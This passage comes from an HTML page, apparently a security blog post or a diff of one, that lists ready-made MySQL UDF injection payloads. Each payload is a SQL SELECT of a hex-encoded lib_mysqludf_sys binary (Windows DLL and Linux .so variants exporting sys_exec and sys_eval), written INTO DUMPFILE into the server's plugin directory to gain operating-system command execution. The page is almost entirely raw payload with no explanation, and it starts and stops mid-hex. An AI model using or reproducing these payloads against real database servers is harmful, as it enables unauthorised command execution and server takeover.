0000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Windows-lib-mysqludf-sys-64-dll"><a href="#Windows-lib-mysqludf-sys-64-dll" class="headerlink" title="Windows - lib_mysqludf_sys_64.dll"></a>Windows - lib_mysqludf_sys_64.dll</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409<span class="hljs-keyword">cd</span>21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008<span class="hljs-keyword">cd</span>4973d20a9f109c1899<span class="hljs-keyword">cd</span>9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20<span class="hljs-keyword">cd</span>26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527<span class="hljs-keyword">cd</span>18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85<span class="hljs-keyword">cd</span>7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375<span class="hljs-keyword">cd</span>8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004<span class="hljs-keyword">cd</span>1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5<span class="hljs-keyword">cd</span>8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068<span class="hljs-keyword">cd</span>760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283<span class="hljs-keyword">cd</span>1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17<span class="hljs-keyword">cd</span>556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.3\\lib\\plugin\\udf.dll&#x27;;<br></code></pre></td></tr></table></figure>
+
+<h2 id="linux-lib-mysqludf-sys-32-so"><a href="#linux-lib-mysqludf-sys-32-so" class="headerlink" title="linux - lib_mysqludf_sys_32.so"></a>linux - lib_mysqludf_sys_32.so</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span> <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/udf.so&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<h2 id="linux-lib-mysqludf-sys-64-so"><a href="#linux-lib-mysqludf-sys-64-so" class="headerlink" title="linux - lib_mysqludf_sys_64.so"></a>linux - lib_mysqludf_sys_64.so</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be1